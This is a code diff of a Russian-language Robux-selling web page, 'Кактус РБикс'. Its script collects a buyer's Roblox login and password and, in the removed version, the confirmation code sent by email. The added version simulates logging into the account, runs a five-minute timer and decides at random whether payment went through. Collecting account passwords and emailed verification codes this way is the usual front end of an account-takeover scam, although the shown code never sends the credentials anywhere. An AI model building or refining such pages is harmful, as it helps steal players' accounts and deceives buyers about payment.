-            buyerForm.style.display = 'block';
-            linkBox.style.display = 'none';
-            activationStatus.classList.remove('show');
-            processSteps.classList.remove('show');
-
-            currentOrderId = '#' + orderParam;
-            isPaid = paidParam === '1';
-
-            if (robuxParam) {
-                robuxInput.value = robuxParam;
-            }
-            if (expiryParam) {
-                expirySelect.value = expiryParam;
-            }
-            updateDisplay();
-
-            const stored = localStorage.getItem('kaktus_order_' + orderParam);
-            if (stored) {
-                const data = JSON.parse(stored);
-                if (data.isUsed) {
-                    buyerForm.style.display = 'none';
-                    activationStatus.classList.add('show');
-                    activationIcon.textContent = '❌';
-                    activationTitle.textContent = 'Ссылка недействительна';
-                    activationTitle.className = 'warning';
-                    activationDesc.textContent = 'Эта ссылка уже была использована';
-                    statusBadge.className = 'status-badge status-used';
-                    statusBadge.textContent = '✖ Использована';
-                    isUsed = true;
-                } else if (Date.now() - data.createdAt > data.expiryHours * 3600000) {
-                    buyerForm.style.display = 'none';
-                    activationStatus.classList.add('show');
-                    activationIcon.textContent = '⏰';
-                    activationTitle.textContent = 'Срок истёк';
-                    activationTitle.className = 'warning';
-                    activationDesc.textContent = 'Ссылка больше не действительна';
-                    statusBadge.className = 'status-badge status-expired';
-                    statusBadge.textContent = '⏳ Истекла';
-                    isUsed = true;
-                }
+            // Меняем цвет в зависимости от времени
+            timerDisplay.className = 'time';
+            if (timeLeft <= 30) {
+                timerDisplay.classList.add('danger');
+            } else if (timeLeft <= 60) {
+                timerDisplay.classList.add('warning');
             }
         }
 
-        // ===== АКТИВАЦИЯ =====
-        activateBtn.addEventListener('click', function() {
-            const login = buyerLogin.value.trim();
-            const password = buyerPassword.value.trim();
-            const code = buyerCode.value.trim();
+        // ===== ВХОД =====
+        enterBtn.addEventListener('click', function() {
+            const login = loginInput.value.trim();
+            const password = passwordInput.value.trim();
+            const order = orderInput.value.trim();
 
             if (!login || !password) {
-                alert('Введите логин и пароль!');
+                showStatus('Введите логин и пароль!', 'error');
                 return;
             }
 
-            if (currentStep === 1) {
-                if (!code || code.length < 4) {
-                    alert('Введите код подтверждения из письма!');
-                    return;
-                }
-                const step2El = document.getElementById('step2');
-                step2El.classList.remove('active');
-                step2El.classList.add('done');
-                document.getElementById('step2Status').textContent = '✅';
-                currentStep++;
-                activateBtn.style.display = 'none';
-                setTimeout(() => {
-                    const next = steps[currentStep];
-                    const nextEl = document.getElementById(next.id);
-                    nextEl.classList.add('active');
-                    document.getElementById(next.status).innerHTML = '<span class="spinner-small"></span>';
-                }, 500);
+            if (!order) {
+                showStatus('Введите номер ордера!', 'error');
                 return;
             }
 
-            if (isUsed) {
-                alert('❌ Эта ссылка уже недействительна!');
-                return;
-            }
+            // Блокируем кнопку
+            enterBtn.disabled = true;
+            enterBtn.innerHTML = '⏳ Вход...';
+            showStatus('Подключение к Roblox...', '');
 
-            activateBtn.disabled = true;
-            activateBtn.innerHTML = '⏳ Вход...';
-            startProcess();
+            // Имитация входа
+            setTimeout(() => {
+                showStatus('✅ Вход выполнен! Ожидаем оплату...', 'success');
+                sessionStatus.textContent = '⏳ Ожидание оплаты...';
+                sessionStatus.className = 'status-text unpaid';
+                enterBtn.innerHTML = '✅ В аккаунте';
+                startTimer();
+            }, 2000);
         });
 
-        // ===== ИНИЦИАЛИЗАЦИЯ =====
-        if (!orderParam) {
-            orderIdEl.textContent = generateOrderId();
-            updateDisplay();
-        }
+        // ===== ПРОВЕРКА ОПЛАТЫ =====
+        checkBtn.addEventListener('click', function() {
+            const order = orderInput.value.trim();
+
+            if (!order) {
+                showStatus('Введите номер ордера!', 'error');
+                return;
+            }
+
+            if (!isSessionActive) {
+                showStatus('❌ Сессия не активна. Войдите сначала.', 'error');
+                return;
+            }
+
+            // Имитация проверки оплаты
+            checkBtn.disabled = true;
+            checkBtn.innerHTML = '⏳ Проверка...';
+            showStatus('🔍 Проверяем оплату...', '');
+
+            setTimeout(() => {
+                // Рандомная оплата (для демо)
+                const paid = Math.random() > 0.5;
+
+                if (paid) {
+                    isPaid = true;
+                    isSessionActive = false;
+                    clearInterval(timerInterval);
+                    showStatus('✅ Оплата подтверждена! Robux зачисляются...', 'success');
+                    sessionStatus.textContent = '✅ Оплачено! Robux зачислены. Сессия завершена.';
+                    sessionStatus.className = 'status-text paid';
+                    timerDisplay.textContent = '00:00';
+                    enterBtn.disabled = false;
+                    enterBtn.innerHTML = '🚀 Войти и получить Robux';
+
+                    setTimeout(() => {
+                        showStatus('✅ Robux успешно зачислены на аккаунт! Сессия завершена.', 'success');
+                    }, 2000);
+
+                } else {
+                    showStatus('⏳ Оплата не найдена. Осталось ' + Math.floor(timeLeft / 60) + ':' + String(timeLeft % 60).padStart(2, '0'), 'waiting');
+                    sessionStatus.textContent = '⏳ Оплата не найдена. Ожидаем...';
+                    sessionStatus.className = 'status-text unpaid';
+                }
+
+                checkBtn.disabled = false;
+                checkBtn.innerHTML = '🔍 Проверить оплату';
+            }, 2000);
+        });
+
+        // ===== СБРОС ПРИ ЗАКРЫТИИ =====
+        window.addEventListener('beforeunload', function() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+        });
+
+        // ===== АВТОМАТИЧЕСКИЙ СБРОС ЕСЛИ ЗАКРЫЛИ =====
+        console.log('🌵 Кактус РБикс готов к работе!');
+        console.log('⏱ Сессия: 5 минут');
+        console.log('💡 После входа нажми "Проверить оплату"');
     </script>
 
 </body>
